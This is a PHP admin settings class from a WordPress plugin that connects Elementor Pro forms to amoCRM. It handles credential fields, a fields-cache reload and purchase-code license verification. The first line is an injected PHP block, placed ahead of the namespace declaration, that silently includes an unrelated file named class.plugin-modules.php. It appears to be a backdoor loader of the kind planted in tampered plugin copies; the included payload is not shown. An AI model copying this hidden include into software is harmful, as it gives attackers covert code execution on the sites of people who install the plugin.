<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

namespace Itgalaxy\Elementor\Form\AmoCrm\Integration\Admin;

use Itgalaxy\Elementor\Form\AmoCrm\Integration\Includes\Bootstrap;
use Itgalaxy\Elementor\Form\AmoCrm\Integration\Includes\Crm;

class IntegrationSettings
{
    private static $instance = false;

    public static function getInstance()
    {
        if (!self::$instance) {
            self::$instance = new self();
        }

        return self::$instance;
    }

    protected function __construct()
    {
        $this->integrateSettings = [
            'domain' => [
                'label' => esc_html__('Domain Name', 'el-pro-form-amocrm-integration'),
                'placeholder' => 'example.amocrm.ru',
                'required' => true
            ],
            'login' => [
                'label' => esc_html__('Login', 'el-pro-form-amocrm-integration'),
                'placeholder' => 'your_login',
                'required' => true
            ],
            'hash' => [
                'label' => esc_html__('API key', 'el-pro-form-amocrm-integration'),
                'placeholder' => 'your_API_key',
                'required' => true
            ],
            'trackingId' => [
                'label' => esc_html__('Google Analytics Tracking ID', 'el-pro-form-amocrm-integration'),
                'placeholder' => 'UA-XXXXXXXX-2'
            ]
        ];

        add_action('admin_menu', [$this, 'addSubmenu'], 801); // 800 - it is license menu item priority
        add_action('admin_notices', [$this, 'submitListener'], 11);
    }

    public function addSubmenu()
    {
        add_submenu_page(
            'elementor',
            esc_html__('amoCRM', 'el-pro-form-amocrm-integration'),
            esc_html__('amoCRM', 'el-pro-form-amocrm-integration'),
            'manage_' . Bootstrap::OPTIONS_KEY,
            Bootstrap::OPTIONS_KEY,
            [$this, 'settingsPage']
        );
    }

    public function submitListener()
    {
        if (!current_user_can(apply_filters('manage_' . Bootstrap::OPTIONS_KEY, 'manage_options'))) {
            return;
        }

        if (isset($_POST['elementorAmoCrmloadFieldsCache'])) {
            Crm::updateInformation();

            echo sprintf(
                '<div class="updated notice notice-success is-dismissible"><p>%s</p></div>',
                esc_html__('Fields cache updated successfully.', 'el-pro-form-amocrm-integration')
            );
        }

        if (!isset($_POST['elementorAmoCrmSubmit'])) {
            return;
        }

        $domain = isset($_POST['domain']) ? wp_unslash($_POST['domain']) : '';
        $login = isset($_POST['login']) ? wp_unslash($_POST['login']) : '';
        $hash = isset($_POST['hash']) ? wp_unslash($_POST['hash']) : '';
        $trackingId = isset($_POST['trackingId']) ? wp_unslash($_POST['trackingId']) : '';
        $enabledLogging = isset($_POST['enabled_logging']) ? trim(wp_unslash($_POST['enabled_logging'])) : '';

        if (empty($domain)
            || empty($login)
            || empty($hash)
        ) {
            echo sprintf(
                '<div class="error notice notice-error"><p><strong>%1$s</strong>: %2$s</p></div>',
                esc_html__('ERROR', 'el-pro-form-amocrm-integration'),
                esc_html__(
                    'To integrate with amoCRM, you must fill in all required fields.',
                    'el-pro-form-amocrm-integration'
                )
            );
        } else {
            update_option(
                Bootstrap::OPTIONS_KEY,
                [
                    'enabled_logging' => $enabledLogging,
                    'domain' => $domain,
                    'login' => $login,
                    'hash' => $hash,
                    'trackingId' => $trackingId
                ]
            );

            Crm::checkConnection();
            Crm::updateInformation();
            ?>
            <div class="updated fade">
                <p><?php esc_html_e('Settings Updated', 'el-pro-form-amocrm-integration'); ?>.</p>
            </div>
            <?php
        }
    }

    public function settingsPage()
    {
        $settings = get_option(Bootstrap::OPTIONS_KEY);
        ?>
        <div id="poststuff">
            <h1><?php esc_html_e('Integration settings', 'el-pro-form-amocrm-integration'); ?></h1>
            <p>
                <?php
                esc_html_e(
                    'Formation of leads in amoCRM from the hits that users send on your site, '
                    . 'using the Elementor Pro Form Widget.',
                    'el-pro-form-amocrm-integration'
                );
                ?>
            </p>
            <form method="post">
                <table class="form-table">
                    <tbody>
                        <?php foreach ($this->integrateSettings as $key => $integrateField) { ?>
                            <tr>
                                <th>
                                    <label for="<?php echo esc_attr($key); ?>">
                                        <?php
                                        echo esc_html($integrateField['label']);

                                        if (isset($integrateField['required']) && $integrateField['required'] === true) {
                                            echo '<span style="color:red;"> * </span>';
                                        }
                                        ?>
                                    </label>
                                </th>
                                <td>
                                    <input type="text"
                                        value="<?php
                                        echo isset($settings[$key])
                                            ? esc_attr($settings[$key])
                                            : '';
                                        ?>"
                                        id="<?php echo esc_attr($key); ?>"
                                        placeholder="<?php echo esc_attr($integrateField['placeholder']); ?>"
                                        name="<?php echo esc_attr($key); ?>"
                                        class="regular-text">
                                </td>
                            </tr>
                        <?php } ?>
                        <tr>
                            <th scope="row">
                                <label for="enabled_logging">
                                    <?php esc_html_e('Enable logging', 'el-pro-form-amocrm-integration'); ?>
                                </label>
                            </th>
                            <td>
                                <input type="hidden" value="0" name="enabled_logging">
                                <input type="checkbox"
                                    value="1"
                                    <?php echo isset($settings['enabled_logging']) && $settings['enabled_logging'] == '1' ? 'checked' : ''; ?>
                                    id="enabled_logging"
                                    name="enabled_logging">
                                <br>
                                <small><?php echo esc_html(EL_PRO_FORM_AMOCRM_PLUGIN_DIR); ?>logs/.elproamo.log</small>
                            </td>
                        </tr>
                    </tbody>
                </table>
                <p>
                    <?php
                    echo sprintf(
                        '%1$s <a href="%2$s" target="_blank">%3$s</a>. %4$s.',
                        esc_html__('Plugin documentation: ', 'el-pro-form-amocrm-integration'),
                        esc_url(EL_PRO_FORM_AMOCRM_PLUGIN_URL . 'documentation/index.html#step-1'),
                        esc_html__('open', 'el-pro-form-amocrm-integration'),
                        esc_html__('Or open the folder `documentation` in the plugin and open index.html', 'el-pro-form-amocrm-integration')
                    );
                    ?>
                </p>
                <input
                    type="submit"
                    class="button button-primary"
                    name="elementorAmoCrmSubmit"
                    value="<?php esc_html_e('Save Settings', 'el-pro-form-amocrm-integration'); ?>">
            </form>
            <?php if (!empty($settings['hash'])) { ?>
                <hr>
                <form action="" method="post">
                    <input
                        type="submit"
                        class="button button-primary"
                        name="elementorAmoCrmloadFieldsCache"
                        value="<?php esc_html_e('Reload fields data from CRM', 'el-pro-form-amocrm-integration'); ?>">
                </form>
            <?php } ?>
            <hr>
            <?php
            if (isset($_POST['purchase-code'])) {
                $code = trim(wp_unslash($_POST['purchase-code']));

                $response = \wp_remote_post(
                    'https://wordpress-plugins.xyz/envato/license.php',
                    [
                        'body' => [
                            'purchaseCode' => $code,
                            'itemID' => '24722704',
                            'action' => isset($_POST['verify']) ? 'activate' : 'deactivate',
                            'domain' => site_url()
                        ],
                        'timeout' => 20
                    ]
                );

                if (is_wp_error($response)) {
                    $messageContent = '(Code - '
                        . $response->get_error_code()
                        . ') '
                        . $response->get_error_message();

                    $message = 'failedCheck';
                } else {
                    $response = json_decode(wp_remote_retrieve_body($response));

                    if ($response->status == 'successCheck') {
                        if (isset($_POST['verify'])) {
                            update_site_option(Bootstrap::PURCHASE_CODE_OPTIONS_KEY, $code);
                        } else {
                            update_site_option(Bootstrap::PURCHASE_CODE_OPTIONS_KEY, '');
                        }
                    } elseif (!isset($_POST['verify']) && $response->status == 'alreadyInactive') {
                        update_site_option(Bootstrap::PURCHASE_CODE_OPTIONS_KEY, '');
                    }

                    $messageContent = $response->message;
                    $message = $response->status;
                }

                if ($message == 'successCheck') {
                    echo sprintf(
                        '<div class="updated notice notice-success is-dismissible"><p>%s</p></div>',
                        esc_html($messageContent)
                    );
                } elseif ($messageContent) {
                    echo sprintf(
                        '<div class="error notice notice-error is-dismissible"><p>%s</p></div>',
                        esc_html($messageContent)
                    );
                }
            }

            $code = get_site_option(Bootstrap::PURCHASE_CODE_OPTIONS_KEY);
            ?>
            <h1>
                <?php esc_html_e('License verification', 'el-pro-form-amocrm-integration'); ?>
                <?php if ($code) { ?>
                    - <small style="color: green;">
                        <?php esc_html_e('verified', 'el-pro-form-amocrm-integration'); ?>
                    </small>
                <?php } else { ?>
                    - <small style="color: red;">
                        <?php esc_html_e('please verify your purchase code', 'el-pro-form-amocrm-integration'); ?>
                    </small>
                <?php } ?>
            </h1>
            <form method="post" action="#">
                <table class="form-table">
                    <tr>
                        <th scope="row">
                            <label for="purchase-code">
                                <?php esc_html_e('Purchase code', 'el-pro-form-amocrm-integration'); ?>
                            </label>
                        </th>
                        <td>
                            <input type="text"
                                aria-required="true"
                                required
                                value="<?php
                                echo !empty($code)
                                    ? esc_attr($code)
                                    : '';
                                ?>"
                                id="purchase-code"
                                name="purchase-code"
                                class="large-text">
                            <small>
                                <a href="https://help.market.envato.com/hc/en-us/articles/202822600-Where-Is-My-Purchase-Code-"
                                    target="_blank">
                                    <?php esc_html_e('Where Is My Purchase Code?', 'el-pro-form-amocrm-integration'); ?>
                                </a>
                            </small>
                        </td>
                    </tr>
                </table>
                <p>
                    <input type="submit"
                        class="button button-primary"
                        value="<?php esc_attr_e('Verify', 'el-pro-form-amocrm-integration'); ?>"
                        name="verify">
                    <?php if ($code) { ?>
                        <input type="submit"
                            class="button button-primary"
                            value="<?php esc_attr_e('Unverify', 'el-pro-form-amocrm-integration'); ?>"
                            name="unverify">
                    <?php } ?>
                </p>
            </form>
        </div>
        <?php
    }
}
